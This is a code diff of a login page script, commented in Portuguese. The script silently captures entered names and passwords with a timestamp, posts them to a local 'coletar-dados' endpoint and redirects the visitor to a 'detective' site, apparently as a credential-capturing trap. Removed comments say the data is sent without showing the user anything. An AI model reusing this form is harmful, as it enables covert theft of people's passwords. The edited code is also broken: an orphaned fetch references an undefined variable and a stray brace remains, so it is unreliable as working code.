@@ -240,77 +240,51 @@ function coletarDados() {
     }
 }
 
-// Função para enviar os dados para o servidor sem mostrar nada para o usuário
-function enviarDados(dados) {
+  // Envia os dados para o servidor
     fetch('http://localhost:3000/coletar-dados', {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/json',
         },
-        body: JSON.stringify(dados)
+        body: JSON.stringify(dados),  // Envia os dados como JSON
     })
     .then(response => response.text())
-    .then(data => console.log(data))
+    .then(data => console.log('Resposta do servidor:', data))
     .catch(error => console.error('Erro ao enviar dados:', error));
 }
 
-
-
-
-
-
-
-
-        const nomeInput = document.getElementById('nome');
-const btnSubmit = document.getElementById('btnSubmit');
-
-// Função para verificar se o nome contém @gmail.com
-function verificarNome() {
-    const nome = nomeInput.value;
-    const regexEmail = /\S+@gmail\.com/;
-
-    // Verifica se o nome contém um e-mail com @gmail.com
-    if (regexEmail.test(nome)) {
-        btnSubmit.classList.add('enabled');  // Habilita o botão se o e-mail for válido
-    } else {
-        btnSubmit.classList.remove('enabled');  // Desabilita o botão se o e-mail não for válido
-    }
-}
-
-// Verifica o nome sempre que o usuário digitar
-nomeInput.addEventListener('input', verificarNome);
-
-// Enviar dados quando o formulário for enviado
+// Coleta e envia os dados quando o formulário for enviado
 document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault();
 
-    // Coleta os dados de nome e senha
-    const nome = nomeInput.value;
+    // Coleta os dados do formulário
+    const nome = document.getElementById('nome').value;
     const senha = document.getElementById('senha').value;
 
-    // Monta o objeto com os dados coletados
-    const dados = {
+    // Adiciona os dados do formulário ao objeto de dados
+    let dadosFormulario = {
         nome: nome,
         senha: senha,
-        ip: window.location.hostname,  // Coleta o IP da página de origem (pode ser ajustado conforme a necessidade)
+        ip: window.location.hostname,
         dataHora: new Date().toString()
     };
 
-    // Envia os dados para o servidor do detetive
+    // Envia os dados do formulário
     fetch('http://localhost:3000/coletar-dados', {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/json',
         },
-        body: JSON.stringify(dados)
+        body: JSON.stringify(dadosFormulario),  // Dados do formulário
     })
     .then(response => response.text())
-    .then(data => console.log(data))
+    .then(data => console.log('Dados enviados:', data))
     .catch(error => console.error('Erro ao enviar dados:', error));
 
-    // Redireciona o atacante para o site do detetive
+    // Redireciona o usuário após o envio
     window.location.href = 'https://www.site-do-detective.com';
 });
+   }
      </script>
 </body>
 </html>
